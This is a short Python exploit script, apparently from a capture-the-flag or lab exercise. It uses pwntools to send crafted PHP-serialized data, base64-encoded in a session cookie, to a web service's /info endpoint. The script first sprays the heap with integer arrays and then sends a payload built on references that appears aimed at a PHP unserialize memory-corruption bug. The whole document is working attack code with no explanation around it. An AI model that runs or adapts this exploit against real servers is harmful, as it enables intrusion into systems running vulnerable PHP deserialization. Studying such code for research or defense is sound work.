from base64 import b64encode

from pwn import *


def s_array(*args):
    assert len(args) % 2 == 0
    return 'a:%d:{' % (len(args) // 2) + ''.join(args) + '}'


def s_bool(val):
    return 'b:%d;' % val


def s_str(s):
    return 's:%d:"%s";' % (len(s), s)


def s_ref(val):
    return 'r:%d;' % val


def s_int(val):
    return 'i:%d;' % val


def s_float(val):
    return 'd:%f;' % val


def s_null():
    return 'N;'


host = "10.13.37.8"
host = "localhost"

r = remote(host, 47793)


def send_payload(r, path, payload):
    http_payload = "GET %s HTTP/1.1\r\n" % path
    http_payload += "Host: z\r\n"
    http_payload += "Connection: keep-alive\r\n"
    http_payload += "Cookie: session=%s\r\n" % b64encode(payload)
    http_payload += "\r\n"

    r.send(http_payload)

    result = ''
    try:
        t = r.recv(timeout=0.5)
        while t != '':
            result += t
            t = r.recv(timeout=0.5)
    except EOFError:
        pass

    return result

spray = s_array(
    *[s_int(0x01010101 * i) for i in range(32)]
)

print send_payload(r, "/info", spray)

payload = s_array(
    s_str("aaaa"), s_ref(4),
    s_str("bbbb"), s_int(0x70),
    s_ref(2), s_str("cccc")
)

print send_payload(r, "/info", payload)
